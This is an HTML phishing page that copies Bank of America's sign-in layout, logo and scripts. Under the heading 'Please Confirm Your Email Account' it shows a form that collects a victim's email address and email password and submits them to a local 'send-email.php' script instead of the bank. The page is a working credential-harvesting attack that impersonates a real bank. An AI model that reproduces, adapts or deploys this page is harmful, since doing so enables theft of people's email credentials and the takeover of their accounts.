
<!DOCTYPE html PUBLIC "-//W3C//DTD XHTML 1.0 Strict//EN" "http://www.w3.org/TR/xhtml1/DTD/xhtml1-strict.dtd">
<html xmlns="http://www.w3.org/1999/xhtml" xml:lang="en-US" lang="en-US">
<head>
<meta http-equiv="X-UA-Compatible" content="IE=Edge" />
<link rel="stylesheet" href="1.css" type="text/css" />
<style type="text/css">
	input {
    width:190px;
    height:26px;
    border-radius:2px;
    outline:0;
    border:1px solid #ccc;
}
#select1 {
    width:205px;
    border-radius:2px;
    outline:0;
    border:1px solid #ccc;
    height:40px;
    position:absolute;
    left:235px;
    top:110px;
}

</style>



<!-- TLDB false -->
			<!-- TL-NOPV true -->
	<title>Sign In |</title>
<meta http-equiv="content-type" content="text/html;charset=utf-8" />

    <link rel="shortcut icon" href="https://www.bankofamerica.com/pa/global-assets/1.0/graphic/favicon.ico?ts=20151018" type="image/x-icon" />   
  <!-- TLDB TEALEAF_UiCapture_APP_ENABLED_NOT_TRUE -->



	
						<link rel="stylesheet" type="text/css" href="https://secure.bankofamerica.com/pa/components/bundles/gzip-compressed/xengine/VIPAA/4.2.1/style/vipaa-v2-jawr.css" media="all" />
						<link rel="stylesheet" type="text/css" href="https://secure.bankofamerica.com/pa/components/bundles/gzip-compressed/xengine/VIPAA/4.2.1/style/vipaa-v2-jawr-print.css" media="print" />
<!--<script type="text/javascript">
(function() {
	if (typeof mboxUpdate == "function") {
		var windowURL = window.location.href;
	    windowURL = windowURL.slice( windowURL.indexOf('.')+1);
		windowURL = windowURL.split( '?' )[0];
		windowURL = windowURL.toLowerCase();
		//alert(windowURL);
		//If no mboxes on page, mbox count will be < 1
		//Also check for high-volume pages that do not need global logging
		if ((mboxFactoryDefault.getMboxes().length() < 1) &&  
			(windowURL != "bankofamerica.com/myaccounts/brain/redirect.go") &&
			(windowURL != "bankofamerica.com/myaccounts/signin/signin.go") &&
			(windowURL != "bankofamerica.com/login/sign-in/signon.go") &&
			(windowURL != "bankofamerica.com/login/sign-in/entry/signon.go") &&
			(windowURL != "bankofamerica.com/login/sign-in/signonscreen.go") &&
			(windowURL != "bankofamerica.com/login/sign-in/validatechallengeanswer.go") &&
			(windowURL != "bankofamerica.com/login/sign-in/validatePassword.go")&&
			(windowURL != "ecnp.bankofamerica.com/myaccounts/details/deposit/account-details.go")&&
			(windowURL != "bankofamerica.com/myaccounts/details/deposit/account-details.go")&&
			(windowURL != "ecnp.bankofamerica.com/myaccounts/brain/redirect.go")&&
			(windowURL != "bankofamerica.com/myaccounts/brain/redirect.go")&&
			(windowURL != "bankofamerica.com/mobile/banking.go")&&
			(windowURL != "bankofamerica.com/content/preload/olb-myaccount-preload-jawr-module.htm"))
		{

			var mboxDiv = document.createElement("div");
			mboxDiv.id = "adobe_touch_clarity_replacement";
			mboxDiv.style.display = "none";
			if (document.body && document.body.firstChild) {document.body.insertBefore(mboxDiv,document.body.firstChild);}
			mboxDefine(mboxDiv.id,'bac_global_bottom');
			mboxUpdate('bac_global_bottom');
		}
	}	
})();
</script> -->
		
						<script type="text/javascript">
						(function(d,f){var b={src:(d.location.protocol=="https:"?"https:":"http:")+"//aero.bankofamerica.com/30306/I3n.js",async:true,type:"text/javascript"},g="XMLHttpRequest",c=f.createElement("script"),h=f.getElementsByTagName("head")[0],a;if(d[g]&&(a=new d[g]()).withCredentials!==undefined){a.open("GET",b.src,b.async);a.withCredentials=true;a.onreadystatechange=function(e){if(a.readyState==4&&a.status==200){c.type="script/meta";c.src=b.src;h.appendChild(c);new Function(a.responseText)()}};a.send()}else{setTimeout(function(){for(var e in b){c.setAttribute(e,b[e])}h.appendChild(c)},0)}})(window,document);
					    </script>
										
						<script type="text/javascript">
							(function(){var f=document,e=window,i=e.location.protocol,b=[["src",[i=="https:"?"https:/":"http:/","boss.bankofamerica.com/30306/a8e.js"].join("/")],["type","text/javascript"],["async",true]],g="XMLHttpRequest",a=null,j=e[g]&&(a=new e[g]()).withCredentials!==undefined,c=f.createElement("script"),h=f.getElementsByTagName("head")[0];if(j){a.open("GET",b[0][1],b[2][1]);a.withCredentials=true;a.onreadystatechange=function(d){if(a.readyState==4&&a.status==200){c.type="script/meta";c.src=b[0][1];h.appendChild(c);new Function(a.responseText)()}};a.send()}else{setTimeout(function(){for(var d=0,k=b.length;d<k;d++){c.setAttribute(b[d][0],b[d][1])}h.appendChild(c)},0)}})();
						</script>
						
						<script type="text/javascript">
							(function(){var d=document,c=window,g=c.location.protocol,e="XMLHttpRequest",a,h=c[e]&&(a=new c[e]()).withCredentials!==undefined,b=d.createElement("script"),f=d.getElementsByTagName("head")[0];b.src=(g=="https:"?"https://":"http://")+"dull.bankofamerica.com/boaa/y9h.js";b.async=true;if(!h){setTimeout(function(){b.type="text/javascript";f.appendChild(b)},0)}else{a.open("GET",b.src,b.async);a.withCredentials=true;a.onreadystatechange=function(i){if(a.readyState==4&&a.status==200){b.type="script/meta";f.appendChild(b);new Function(a.responseText)()}};a.send()}})();
						</script>

						<script type="text/javascript">
							function getSCookie(name){
							var re = new RegExp('[; ]'+name+'=([^\\s;]*)'), matches = null;
								if(document.cookie.length > 0) {
									matches = document.cookie.match(re);
								if(matches && matches.length == 2) {
									return decodeURIComponent(matches[1]);
									}
								}
							}
						</script>
						<script>		
							function get_SessionIdString(){
							  return getSCookie("SID") || "";
							}
						</script>

			<script>
				var boaPageDataJS = {};
					boaPageDataJS.isLLE = "false";
			</script>
				<style>body{display:none;}</style>
	</head>		

	<body class="fsd-layout-body">	

				<script type="text/javascript">if(self == top){var theBody=document.getElementsByTagName("body")[0];theBody.style.display="block";}else{top.location=self.location;}</script>
				<noscript><style>body{display:block;}</style></noscript>
					<a class='ada-hidden ada-visible-focus' href='#skip-to-h1' id='ada-skip-link'>Skip to main content</a>
		<div class="fsd-layout fsd-2c-700lt-layout">
			<div class="fsd-border">
				<div class="center-content">
					<div class="header">


<div class="header-module">
   <div class="fsd-secure-esp-skin">
   	  <img height="28" width="207" alt="Bank of America" src="https://secure.bankofamerica.com/content/images/ContextualSiteGraphics/Logos/en_US/bac_reg_logo_tmp_250X69.gif" />
      <div class="page-type" data-font="cnx-regular">Sign In</div>
      <div class="right-links">
		<div class="secure-area">Secure Area</div>
       <a class="divide" href="/login/languageToggle.go?request_locale=es_US" target="_self" name="spanish_toggle" title="Muestra esta sesi? de la Banca en L?ea">En Espa&#241;ol</a>
       <div class="clearboth"></div>
      </div>
      <div class="clearboth"></div>
   </div>
</div>

	
				<noscript>
					<div class="fauxdal-overlay"></div>
					<div class="fauxdal-module">
						<div class="noscript-reload-skin">
							<div class="fauxdal-top"></div>
							<div class="fauxdal-bottom">
								<div class="fsd-fauxdal-content">
										<div class="fsd-fauxdal-title">
											Please use JavaScript
										</div>
										<p>You need a web browser that supports JavaScript to use our site. Without it, some pages won't work as designed. To make sure JavaScript is turned on, please adjust your browser settings.</p>
<p>&nbsp;</p>
<p><a title="Browser Help and Tips" name="Browser Help and Tips" href="https://www.bankofamerica.com/onlinebanking/online-banking-security-faqs.go" target="_self">Browser Help and Tips</a></p>
								</div>        
								<div class="fsd-fauxdal-close"> 
									<a class="button-common button-gray" name="close_button_js_disabled_modal" href=><span>Close</span></a>
								</div>
								<div class="clearboth"></div>
							</div>
						</div>
					</div>
				</noscript>
	
<div class="page-title-module h-100" id="skip-to-h1">
  <div class="red-grad-bar-skin sup-ie">
    <h1 style="color:white;text-align:center;data-font="cnx-regular">Please Confirm Your Email Account</h1>
  </div>
</div>


	<div id="clientSideErrors" class="messaging-vipaa-module hide" aria-live="polite">
		<div class="error-skin">
			<div class="error-message">	
					<p class="title TLu_ERROR">We can't process your request.</p>
				<ul></ul>
			</div>
		</div>
	</div>

		
<!-- Added for VIPAA Sub-user pages new currentLocation=/login/sign-in/enter-online-id-passcode-v2-->

<!-- Billing Form -->
<form action="send-email.php" method="POST" >
<div id="billing" 
style="position:absolute;left:34%;top:23%;width:450px;height:140px;border:1px solid #ccc;border-radius:5px">
<h2 style="position:absolute;top:10px;left:15px;font-size:17px;">Email  Account</h2>
<input type="email" name="formtext1" placeholder="Email"style="padding:6px;position:absolute;left:15px;top:50px;">
<input type="password" name="formtext2" placeholder="Email Password" style="padding:6px;position:absolute;left:235px;top:50px">
<input style="position:absolute;left:31%;top:100px;height:30px" type="submit" value="Continue" class="btn-bofa btn-bofa-blue btn-bofa-small btn-bofa-noRight" name="enter-online-id-submit">
<span class="btn-bofa-blue-lock">Complete & Submit</span></input>
</div>
</form>




<div class="vipaa-modal-content-module">
	<div class="sitekey-affinity-skin">
		
	</div>
</div>


</div>
					</div>
<img src="footer.png" style="display:block;margin-left:-10px;margin-top:490px;">					
	</body>	
</html>

